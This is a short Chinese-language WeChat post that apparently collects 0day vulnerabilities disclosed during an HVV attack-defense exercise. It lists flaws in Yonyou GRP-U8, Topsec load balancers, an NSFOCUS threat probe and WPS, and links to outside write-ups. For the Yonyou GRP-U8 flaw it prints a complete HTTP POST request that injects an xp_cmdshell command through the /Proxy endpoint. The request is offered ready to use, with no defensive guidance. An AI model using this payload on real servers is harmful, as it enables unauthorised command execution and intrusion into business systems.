\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/4-M6KCMLtfpn8vZhSDN1ng)

紧张刺激的 HVV 开始了，第一天就出来这些 0day。  

有的漏洞详情较长，不太想排版编辑，大家就点击一下链接凑合看吧。  

其中 WPS RCE 的漏洞为 9 月初就爆出来了

  
用友 GRP-U8 SQL 注入

https://www.hedysx.com/2599.html

```
POST /Proxy HTTP/1.1
Accept: Accept: \*/\*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: host
Content-Length: 357
Connection: Keep-Alive
Cache-Control: no-cache
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS\_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp\_cmdshell 'ipconfig'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/kOxLp8DkyylWic0XRZkfYCc6Lrb0ibDSD8seWHPhGZIIe2DrTQ7X0nkOicN82LokG0EAibZocgIPT5IM6B8oEhk4Dw/640?wx_fmt=jpeg)

天融信 Top-app LB 负载均衡 SQL 注入漏洞

https://www.hedysx.com/2601.html

![](https://mmbiz.qpic.cn/mmbiz_jpg/kOxLp8DkyylWic0XRZkfYCc6Lrb0ibDSD8icvTOH2wSurGU8WajHH2J3JO3dibZ1oPvDlkwxrvISsictsdOXvibd6sxA/640?wx_fmt=jpeg)

绿盟 UTS 综合威胁探针管理员任意登录 - 可替换 MD5

绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。

绿盟综合威胁探针设备版本 V2.0R00F02SP02 及之前存在此漏洞。

漏洞详情：https://www.hedysx.com/2612.html

![](https://mmbiz.qpic.cn/mmbiz_png/kOxLp8DkyylWic0XRZkfYCc6Lrb0ibDSD8ndDHibmI0k0hmrs3TxAiciav8v2uS7EZib1oaCXg58gx8eR2piaFicUG7JKA/640?wx_fmt=png)

WPS RCE  

https://www.hedysx.com/2622.html

![](https://mmbiz.qpic.cn/mmbiz_jpg/kOxLp8DkyylWic0XRZkfYCc6Lrb0ibDSD8EwAn7p2mLJjhfpMFHG9mP6YCUHoDbLicibnuteicDzXAmjdlESxfibW2XQ/640?wx_fmt=jpeg)